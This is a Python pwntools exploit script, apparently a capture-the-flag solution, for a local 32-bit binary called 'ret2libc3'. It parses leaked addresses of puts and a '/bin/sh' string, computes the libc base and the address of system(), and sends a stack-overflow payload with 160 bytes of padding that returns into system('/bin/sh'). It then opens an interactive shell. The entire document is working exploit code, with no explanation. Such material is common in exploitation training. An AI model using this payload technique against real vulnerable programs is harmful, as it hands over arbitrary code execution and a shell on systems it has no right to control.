#!/bin/python3

from pwn import *


binaryName = 'ret2libc3'

libc_loc = os.popen(f'ldd {binaryName}').read().split('\n')[1].strip().split()[2]

# context.log_level = 'debug'

p = process(f'./{binaryName}')
e = ELF(f'./{binaryName}')
l = ELF(libc_loc)

p.recvuntil('puts: ')
loc_puts_address = int(p.recvuntil('\n').rstrip(), 16)

p.recvuntil('useful_string: ')
loc_binsh_address = int(p.recvuntil('\n').rstrip(), 16)

libc_puts_address = l.sym['puts']

libc_base_address = loc_puts_address - libc_puts_address

libc_system_address = libc_base_address + l.sym['system']

offsetToRet = 0x00b8 - 0x0018 # 160 offset
offsetToParam = 4

payload = b'A'*offsetToRet
payload += p32(libc_system_address)
payload += b'B'*offsetToParam
payload += p32(loc_binsh_address)

p.sendline(payload)

p.interactive()




